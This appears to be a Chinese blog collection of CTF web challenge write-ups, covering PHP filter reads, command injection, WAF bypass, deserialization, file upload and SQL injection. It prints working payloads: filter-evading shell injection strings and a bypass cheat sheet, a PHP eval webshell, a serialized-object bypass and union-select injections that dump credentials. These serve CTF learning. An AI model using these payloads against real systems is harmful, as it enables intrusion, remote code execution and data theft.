+<p>可以看到这段代码中没有过滤php://，并且提示flag在flag.php中，所以使用php伪协议读取<code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code>得到base64解码即可。</p>
+<h3 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h3><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201202201824877.png" alt="image-20201202201824877"></p>
+<p>试试ip，正常回显</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201202202154220.png" alt="image-20201202202154220"></p>
+<p>试试命令执行</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201202202237785.png" alt="image-20201202202237785"></p>
+<p>查看flag.php</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201202223029487.png" alt="image-20201202223029487"></p>
+<p> 猜测是空格被过滤了<br> 用$IFS$1代替 </p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201202223258355.png" alt="image-20201202223258355"></p>
+<p>查看index.php</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201202223345593.png" alt="image-20201202223345593"></p>
+<p>可以看到过滤了很多字符</p>
+<p> 但是在最后我们看到了a变量，那我们是不是可以将a的值覆盖，然后进行绕过呢？ </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=127.0.0.1||a=g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure>
+
+<p>查看源码即可</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201202224040703.png" alt="image-20201202224040703"></p>
+<p>还可以对cat flag.php进行编码</p>
+<p>构造payload<br>echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</p>
+<p><strong>知识点1：空格绕过</strong></p>
+<p>处理方法：1.全局变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.$&#123;IFS&#125;</span><br><span class="line">2.$IFS$1 #注释：最后一句的意识是取第几个参数的意思，当没有参数的时候，就不用考虑</span><br><span class="line">3.重定向符：&lt;&gt;</span><br><span class="line">4.定义变量#cmd=$&#x27;\x201234&#x27;&amp;&amp;echo$cmd  这个方式可以用ASCII编码，绕过所有字符限制。</span><br><span class="line">5.&#123;cat,flag.php&#125;  //用逗号实现了空格功能</span><br></pre></td></tr></table></figure>
+
+<p><strong>知识点2：过滤字符了链接</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">echo ()|base64 -d|sh</span><br><span class="line">echo ()| base64 -d|bash</span><br><span class="line">`echo ()|base64 -d&#x27;</span><br><span class="line">变量拼接a=l;b=s;$a$b</span><br><span class="line">*贪婪匹配</span><br><span class="line">反斜杠绕过 echo f\lag.php</span><br><span class="line">编码绕过</span><br><span class="line">  $(printf &quot;\154\163&quot;) ==&gt;ls</span><br><span class="line">  $(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) ==&gt;cat /flag</span><br><span class="line">  &#123;printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;&#125;|\$0 ==&gt;cat /flag</span><br><span class="line"> 特殊变量 1; l$@s -l;1 · 1; l$*s -l;1 1; l$ns -l;1 //n为任意数字都可以</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="ACTF2020-新生赛-Exec-1"><a href="#ACTF2020-新生赛-Exec-1" class="headerlink" title="[ACTF2020 新生赛]Exec 1"></a>[ACTF2020 新生赛]Exec 1</h3><p>很简单的命令执行</p>
+<p>|ls</p>
+<p>|cat flag即可</p>
+<h3 id="极客大挑战-2019-Knife-1"><a href="#极客大挑战-2019-Knife-1" class="headerlink" title="[极客大挑战 2019]Knife 1"></a>[极客大挑战 2019]Knife 1</h3><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201202230350501.png" alt="image-20201202230350501"></p>
+<p>直接上菜刀连接，在根目录下有flag</p>
+<h3 id="RoarCTF-2019-Easy-Calc-1"><a href="#RoarCTF-2019-Easy-Calc-1" class="headerlink" title="[RoarCTF 2019]Easy Calc 1"></a>[RoarCTF 2019]Easy Calc 1</h3><p>算了一下，</p>
+<p>试了试||、&amp;&amp;、|、&amp;、;   都不行，看看源码</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201204210320229.png" alt="image-20201204210320229"></p>
+<p>说是有waf，</p>
+<p>$(“#content”).val()<br>获取id为content的HTML标签元素的值,是JQuery<br>$(“#content”)<br>同document.getElementById(“content”);<br>$(“#content”).val()<br>同document.getElementById(“content”).value;</p>
+<p>但是看到了calc.php，访问一下</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201204210419176.png" alt="image-20201204210419176"></p>
+<p>加上num试试</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201204211624621.png" alt="image-20201204211624621"></p>
+<p>url编码之后才行</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201204211649123.png" alt="image-20201204211649123"></p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201204211720604.png" alt="image-20201204211720604"></p>
+<p>但是，一输入特殊字符就forbidden，应该是waf</p>
+<p>可是我们不知道waf如何写的，，该如何绕过呢？？<br>其实利用PHP的字符串解析特性就能够进行绕过waf！！<br>构造参数? num=phpinfo()（注意num前面有个空格）就能够绕过：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? num=phpinfo()</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201204222836272.png" alt="image-20201204222836272"></p>
+<p>由于“/”被过滤了，，，所以我们可以使用chr(47)来进行表示，进行目录读取：</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201204223354547.png" alt="image-20201204223354547"></p>
+<p>读取flag</p>
+<p>file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</p>
+<p>var_dump(file(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201204223533883.png" alt="image-20201204223533883"></p>
+<h3 id="极客大挑战-2019-PHP-1"><a href="#极客大挑战-2019-PHP-1" class="headerlink" title="[极客大挑战 2019]PHP 1"></a>[极客大挑战 2019]PHP 1</h3><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205194600014.png" alt="image-20201205194600014"></p>
+<p>备份网站？是暗示吗？</p>
+<p>扫一下网站目录试试</p>
+<p>python3 dirsearch.py -u <a target="_blank" rel="noopener" href="http://9743478f-8031-45e4-9f2d-9643a2105dc9.node3.buuoj.cn/">http://9743478f-8031-45e4-9f2d-9643a2105dc9.node3.buuoj.cn/</a> -e *</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205212413049.png" alt="image-20201205212413049"></p>
+<p>访问试试<a target="_blank" rel="noopener" href="http://www.zip试试,拿到源码/">www.zip试试，拿到源码</a></p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>;</span><br><span class="line">   <span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line">   <span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br><span class="line">   <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>要get提交select，然后反序列化</p>
+<p>class.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>根据代码的意思，我们可以发现如果username=admin      password=100然后我们再执行__destruct()</p>
+<p>那接下来我们可以构造反序列Pyload了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Name(<span class="string">&#x27;admin&#x27;</span>, <span class="number">100</span>);</span><br><span class="line">var_dump(serialize(<span class="variable">$a</span>));</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205213502972.png" alt="image-20201205213502972"></p>
+<p>反序列化unserialize()的话它是会直接执行__wake up()这个魔术方法的。那我们就要想办法让这个反序列绕过__wake up()执行_\_destruct()</p>
+<p>而在反序列化里，当前属性个数大于实际属性个数的时候，它就会直接绕过_wake up()从而执行__destruct()的。然后我们修改一下序列化字符串（name：2改成3）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>尝试之后居然不行？</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205214543474.png" alt="image-20201205214543474"></p>
+<p>然后我们又意识到，这个变量是private</p>
+<p>private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字</p>
+<p>段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度</p>
+<p>于是我们在构造一回pyload:</p>
+<p>?select=O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205214639982.png" alt="image-20201205214639982"></p>
+<h3 id="极客大挑战-2019-Http-1"><a href="#极客大挑战-2019-Http-1" class="headerlink" title="[极客大挑战 2019]Http 1"></a>[极客大挑战 2019]Http 1</h3><p>看看源码</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205220909356.png" alt="image-20201205220909356"></p>
+<p>发现secret.php</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205221102544.png" alt="image-20201205221102544"></p>
+<p>抓包修改refer头</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205221645884.png" alt="image-20201205221645884"></p>
+<p>提示变成了Please use “Syclover” browser</p>
+<p>修改User-agent: Syclover browser</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205221759545.png" alt="image-20201205221759545"></p>
+<p>No!!! you can only read this locally!!</p>
+<p>有毒？</p>
+<p>修改X-Forwoeded-For: 127.0.0.1，得到flag</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205221926010.png" alt="image-20201205221926010"></p>
+<h3 id="极客大挑战-2019-Upload-1"><a href="#极客大挑战-2019-Upload-1" class="headerlink" title="[极客大挑战 2019]Upload 1"></a>[极客大挑战 2019]Upload 1</h3><p>上传正常图片</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205223408268.png" alt="image-20201205223408268"></p>
+<p>上传了个一句话木马，也是这样，</p>
+<p>继续尝试，换个GIF马试试，上传shell123.jpg，回显不一样了，看来是需要GIF</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205223646430.png" alt="image-20201205223646430"></p>
+<p>更改继续尝试</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205224207314.png" alt="image-20201205224207314"></p>
+<p>继续尝试php3、php5、pht都失败</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205224743897.png" alt="image-20201205224743897"></p>
+<p>最后发现phtml可以</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205224810817.png" alt="image-20201205224810817"></p>
+<p>回显再次变成了说包含&lt;?</p>
+<p>更改木马内容为</p>
+ <script language='php'>@eval($_POST['cmd']);</script>  
+<p>再次上传</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205224934243.png" alt="image-20201205224934243"></p>
+<p>尝试访问</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205225015752.png" alt="image-20201205225015752"></p>
+<p>菜刀连接，找到flag</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205225157201.png" alt="image-20201205225157201"></p>
+<h3 id="极客大挑战-2019-BabySQL-1"><a href="#极客大挑战-2019-BabySQL-1" class="headerlink" title="[极客大挑战 2019]BabySQL 1"></a>[极客大挑战 2019]BabySQL 1</h3><p>尝试万能密码username=1+or+1%3D1&amp;password=1</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205225854848.png" alt="image-20201205225854848"></p>
+<p>单引号闭合试试</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205230013626.png" alt="image-20201205230013626"></p>
+<p>注释掉password后面的试试，，，，，额，还是不对</p>
+<p>换之前的用户名admin</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205230411507.png" alt="image-20201205230411507"></p>
+<p>回显了密码</p>
+<p>猜测列数</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205230538232.png" alt="image-20201205230538232"></p>
+<p>or被删除了，双写试试，还是被去掉了，大写也不行</p>
+<p>用union select 试试</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205231153819.png" alt="image-20201205231153819"></p>
+<p>又被删除了吗？</p>
+<p>双写试试</p>
+<p>?username=admin’+ununionion+selselectect+1,2,3%23&amp;password=1</p>
+<p>回显正常</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205231229789.png" alt="image-20201205231229789"></p>
+<p>发现有三列</p>
+<p>爆库</p>
+<p>?username=-1’+ununionion+selselectect+1,2,database()%23&amp;password=1</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205231326467.png" alt="image-20201205231326467"></p>
+<p>爆表</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205231606795.png" alt="image-20201205231606795"></p>
+<p>发现from information_schema，where都被过滤，双写试试</p>
+<p>?username=-1’+ununionion+selselectect+1,2,group_concat(table_name)+frfromom+infoorrmation_schema.tables+whwhereere+table_schema=database()%23&amp;password=1</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205232043564.png" alt="image-20201205232043564"></p>
+<p>爆列</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;+ununionion+selselectect+1,2,group_concat(column_name)+frfromom+infoorrmation_schema.columns+whwhereere+table_name=&quot;b4bsql&quot;%23&amp;password=1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205232326740.png" alt="image-20201205232326740"></p>
+<p>查数据</p>
+<p>?username=-1’+ununionion+selselectect+1,2,group_concat(username,”-“,passwoorrd)+frfromom+b4bsql%23&amp;password=1 </p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201205232558100.png" alt="image-20201205232558100"></p>
+<h3 id="HCTF-2018-admin1"><a href="#HCTF-2018-admin1" class="headerlink" title="[HCTF 2018]admin1"></a>[HCTF 2018]admin1</h3><p>注册之后，登录</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206141327995.png" alt="image-20201206141327995"></p>
+<p>查看源码</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206141352225.png" alt="image-20201206141352225"></p>
+<p>只写着说youarenotadmin，要想办法变成admin了</p>
+<p>于是就使用账号admin密码123发现直接就能等进去了。而且首页就显示出falg了，不感相信退出去输入密码123123发现显示密码错误。推测admin的密码真的是123。感觉考点肯定不是弱密码，估计是作者没太在意，假装不知道密码继续做下去。</p>
+<p> 在登陆的情况下能访问三个页面<code>index</code>、<code>posts</code>、<code>edit</code>、<code>change</code>。逐个看看有没有什么能利用的地方。 </p>
+<p>​        index页面和之前的index页面查看源代码是一样的。<br>​        posts页面进入只会显示404，就算再后面新增了文章也是一样。<br>​        edit页面是一个类似博客编写页面，有两个文本框，但试了一下XSS都被过滤了。<br>​        change页面是一个修改密码的页面。可能存在逻辑漏洞，尝试一下。</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206150605538.png" alt="image-20201206150605538"></p>
+<p>​        发现不需要输入之前的密码直接输入新密码就行，这样就不存在多步骤校验可能存在的逻辑绕过。</p>
+<p>​        <img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206150644552.png" alt="image-20201206150644552"></p>
+<p>​        查看报文发现报文中没有写用户名，里面只有一个新密码。证明用户名是通过session来获取的，所以也不存在中间截获修改的漏洞。但在修改密码页面的源代码中发现提示了我们整个工程的Git地址。</p>
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206152052920.png" alt="image-20201206152052920"></p>
+<p>拿到源码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% include(&#x27;header.html&#x27;) %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>Hello &#123;&#123; session[&#x27;name&#x27;] &#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% if current_user.is_authenticated and session[&#x27;name&#x27;] == &#x27;admin&#x27; %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>hctf&#123;xxxxxxxxx&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line"><span class="comment">&lt;!-- you are not admin --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>Welcome to hctf<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#123;% include(&#x27;footer.html&#x27;) %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p> 可以从上面<code>index</code>页面模板看出只要从session中得到的值<code>name</code>为admin就会显示<code>flag</code>。</p>
+<p>查阅资料得知，flask 是非常轻量级的 Web框架 ，其 session  存储在客户端中，也就是说其实只是将相关内容进行了加密保存到session中。和服务端的session不同，服务端的session保存在服务端中，依靠客户端cookie值中的sessionId来进行识别。本身sessionId是没有价值的，而客户端的session是可以被截取破解后得到有价值的原文。在网上找了一个解密的脚本： </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.html</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> session_json_serializer</span><br><span class="line"><span class="keyword">from</span> itsdangerous <span class="keyword">import</span> base64_decode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span>(<span class="params">payload</span>):</span></span><br><span class="line">    payload, sig = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">    payload, timestamp = payload.rsplit(<span class="string">b&#x27;.&#x27;</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    decompress = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> payload.startswith(<span class="string">b&#x27;.&#x27;</span>):</span><br><span class="line">        payload = payload[<span class="number">1</span>:]</span><br><span class="line">        decompress = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = base64_decode(payload)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not base64 decode the payload because of &#x27;</span></span><br><span class="line">                         <span class="string">&#x27;an exception&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> decompress:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            payload = zlib.decompress(payload)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not zlib decompress the payload before &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;decoding the payload&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> session_json_serializer.loads(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    s = <span class="string">&quot;.eJw9kMGKwkAQRH9l6bOHJGYvgoeVSSRCd1AmCdMXcTUmM9l2ISqaEf99gyye6lDFo6oesD329bmF2aW_1hPY2gPMHvDxDTMwkgy5LmKjM48qG3JVxOhLy24fYmViUqOqRWsEQ_LJ3bhuyi4VE43ZKm1Z4Y1V-kOuuKOkNtelY2Ui41qLah1QVQR5VVqjvzxV2UCqFF6WkquFxWhjWXU-r4qB_KojnUTsmph0EbCUbux0Yz3mXTJlyebwnMD-3B-3l9-uPr0noN6PE8ixxk_UGJOsb7wcq4kJaMkd641D10SkW8t65civB9PMXzgru6Z-k0guAf47p52MBuwOYk8hTOB6rvvXcRAG8PwD9uBt8Q.X8yKzg.NjWoGG8XKlG6tjeTodQ8RB7yquQ&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(decryption(s.encode()))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20201206154108690.png" alt="image-20201206154108690"></p>
